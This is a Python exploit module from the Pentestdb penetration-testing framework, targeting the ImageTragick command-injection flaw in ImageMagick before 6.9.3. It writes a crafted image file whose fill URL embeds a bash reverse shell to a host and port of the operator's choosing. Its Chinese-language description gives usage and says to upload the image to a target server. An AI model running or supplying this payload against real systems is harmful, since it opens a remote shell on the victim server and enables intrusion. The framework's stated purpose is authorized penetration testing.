#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2015 alpha1e0
'''

import sys
import os

from script.libs.exploit import Exploit
from script.libs.exploit import Result



class ImageTragick(Exploit):
    expName = u"ImageMagick ImageTragick远程命令执行"
    version = "1.0"
    author = "alpha1e0"
    language = "php"
    appName = "ImageMagick"
    reference = ['http://www.openwall.com/lists/oss-security/2016/05/03/18']
    description = u'''
        版本小于6.9.3，该exploit生成用于攻击的图片
        自定义参数:
            host: 反弹shell的目的服务器
            port：反弹shell的目的端口
        使用示例：
            pen.py exploit -e "imagemagick" --elseargs host="1.1.1.1"#port=80 -u test.com
        注：
            该exploit不需要--url参数，随意指定即可
    '''

    def _info(self):
        result = Result(self)
        if "host" not in self.args or "port" not in self.args:
            result['isvul'] = result.ERROR
            result['elseinfo'] = u"缺少参数host,port 请指定参数，例如--elseargs host=x.x.x.x#port=80"
            return result

        vulContent = ("push graphic-context\n"
            "viewbox 0 0 640 480\n"
            "fill 'url(https://example.com/image.jpg\"|bash -i >& /dev/tcp/host/port 0>&1\")'\n"
            "pop graphic-context")

        vulContent = vulContent.replace('host',self.args['host'])
        vulContent = vulContent.replace('port',self.args['port'])

        vulImagePath = os.path.join(sys.path[0],"else","vul.png")
        with open(vulImagePath, "w") as _file:
            _file.write(vulContent)

        result['isvul'] = result.INFO
        result['payload'] = vulContent
        result['elseinfo'] = u"已生成vul图片{0}, 将该图片上传到服务器，进行图片操作".format(vulImagePath)

        return result


